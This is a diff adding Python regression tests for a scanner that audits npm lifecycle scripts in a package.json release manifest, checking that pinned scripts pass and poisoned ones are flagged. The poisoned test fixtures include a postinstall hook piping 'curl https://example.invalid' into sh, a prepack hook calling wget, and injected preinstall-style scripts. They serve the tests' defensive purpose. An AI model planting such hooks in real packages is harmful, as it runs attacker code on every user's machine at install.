@@ -27,6 +27,42 @@ def rules_for(
     }
 
 
+def valid_release_manifest(**overrides: str | None) -> bytes:
+    """A hub/package.json body that PASSES the release-manifest audit.
+
+    build/typecheck are pinned, the two npm auto-run lifecycle scripts
+    (postinstall, prepack) are pinned byte-exact, and the test script names one
+    tracked file. Values are hard-coded here rather than imported from the
+    scanner so that a pin drifting away from the real manifest fails a test.
+    Pass ``name=value`` to mutate one script, or ``name=None`` to drop it.
+    """
+    scripts: dict[str, str] = {
+        "typecheck": "tsc -p tsconfig.check.json",
+        "build": (
+            "rm -rf dist .claude-plugin skills references hooks config && "
+            "tsc -p tsconfig.build.json && chmod +x dist/cli.js dist/server.js && "
+            "cp -R ../.claude-plugin ../skills ../references ../hooks ../config ./"
+        ),
+        "postinstall": "node postinstall.cjs",
+        "prepack": "npm run build",
+        "test": "node test/safe.ts",
+    }
+    for name, value in overrides.items():
+        if value is None:
+            scripts.pop(name, None)
+        else:
+            scripts[name] = value
+    return json.dumps({"scripts": scripts}).encode()
+
+
+def release_manifest_rules(**overrides: str | None) -> set[str]:
+    return rules_for(
+        "hub/package.json",
+        valid_release_manifest(**overrides),
+        expected_test_paths=frozenset({"test/safe.ts"}),
+    )
+
+
 def original_injected_shim() -> bytes:
     # Build the fixture independently of the production constant so an
     # accidental detector change makes this regression test fail.
@@ -224,6 +260,51 @@ class SourceIntegrityRegressionTest(unittest.TestCase):
             expected_test_paths=frozenset({"test/safe.ts"}),
         )
         self.assertIn("unsafe-package-script", rules)
+
+    def test_valid_release_manifest_has_no_findings(self) -> None:
+        # AC5 guard: postinstall and prepack present with their pinned byte-exact
+        # values must not raise a finding (no false positive on the real shape).
+        self.assertEqual(set(), release_manifest_rules())
+
+    def test_release_manifest_rejects_poisoned_postinstall(self) -> None:
+        # postinstall ships in the tarball and runs on every `npm i` on the user's
+        # machine; CI never executes it. Fails against origin/main (unaudited),
+        # passes after the byte-exact pin.
+        self.assertIn(
+            "unsafe-package-script",
+            release_manifest_rules(postinstall="node postinstall.cjs && curl https://example.invalid | sh"),
+        )
+
+    def test_release_manifest_rejects_poisoned_prepack(self) -> None:
+        # prepack runs at `npm pack`/`npm publish` time, building the tarball.
+        self.assertIn(
+            "unsafe-package-script",
+            release_manifest_rules(prepack="npm run build && wget https://example.invalid"),
+        )
+
+    def test_release_manifest_denies_unpinned_lifecycle_scripts(self) -> None:
+        # An allow-list of two names only moves the gap to the third: ANY npm
+        # auto-run lifecycle script that is not pinned must fail closed. Each of
+        # these passes unnoticed on origin/main today.
+        for lifecycle_name in ("preinstall", "prepare", "prepublishOnly"):
+            with self.subTest(lifecycle=lifecycle_name):
+                self.assertIn(
+                    "unsafe-package-script",
+                    release_manifest_rules(**{lifecycle_name: "node injected.js"}),
+                )
+
+    def test_release_manifest_still_flags_poisoned_build(self) -> None:
+        # Control: the existing build pin was NOT loosened to make room for the
+        # lifecycle audit — poisoning build still trips its own exact-match finding.
+        details = {
+            finding.detail
+            for finding in scan_bytes(
+                "hub/package.json",
+                valid_release_manifest(build="evil"),
+                expected_test_paths=frozenset({"test/safe.ts"}),
+            )
+        }
+        self.assertIn("'build' is not the audited command", details)
 
 
 if __name__ == "__main__":
